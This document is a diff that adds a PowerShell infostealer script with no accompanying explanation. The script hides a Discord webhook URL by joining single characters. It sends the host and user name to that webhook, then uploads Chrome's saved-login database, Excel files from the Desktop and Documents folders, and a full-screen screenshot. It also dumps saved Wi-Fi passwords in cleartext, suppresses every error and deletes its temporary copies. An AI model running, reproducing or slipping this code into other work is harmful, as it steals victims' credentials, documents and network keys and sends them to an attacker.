@@ -1,0 +1,32 @@
+$w=([string]::Join('',('h','t','t','p','s',':','/','/','p','t','b','.','d','i','s','c','o','r','d','.','c','o','m','/','a','p','i','/','w','e','b','h','o','o','k','s','/','1','4','8','4','3','7','2','2','6','6','7','1','0','9','9','5','0','2','6','/','j','h','p','U','0','7','7','6','t','L','s','C','j','R','N','_','R','i','w','f','H','5','P','F','T','H','g','1','X','a','Z','Q','J','O','T','c','d','w','0','F','E','B','t','A','N','I','m','d','n','E','Z','4','c','j','f','6','s','T','_','s','h','8','m','H','g','d','b','U')))
+
+function S($p){try{(New-Object Net.WebClient).UploadFile($w,$p)}catch{}}
+function T($m){try{$b=@{content=$m}|ConvertTo-Json;Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType "application/json"}catch{}}
+
+T("🚀 $env:COMPUTERNAME - $env:USERNAME")
+
+$c="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+if(Test-Path $c){$t="$env:temp\c.db";Copy-Item $c $t;S $t;Remove-Item $t}
+
+$d="$env:USERPROFILE\Desktop";$doc="$env:USERPROFILE\Documents"
+Get-ChildItem $d,$doc -Filter *.xlsx -File -EA 0|%{$f="$env:temp\$($_.Name)";Copy-Item $_.FullName $f;S $f;Remove-Item $f}
+
+try{
+Add-Type -A System.Windows.Forms,System.Drawing
+$s=[System.Windows.Forms.SystemInformation]::VirtualScreen
+$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height
+$g=[System.Drawing.Graphics]::FromImage($b)
+$g.CopyFromScreen($s.X,$s.Y,0,0,$b.Size)
+$ss="$env:temp\ss.png"
+$b.Save($ss)
+S $ss
+Remove-Item $ss
+}catch{}
+
+try{
+netsh wlan show profiles|Select-String "Profil utilisateur"|%{$n=($_ -split ":")[1].Trim()
+$p=netsh wlan show profile name="$n" key=clear|Select-String "Contenu de la clé"
+if($p){T("📶 $n : $(($p -split ':')[1].Trim())")}}
+}catch{}
+
+T("✅ DONE")
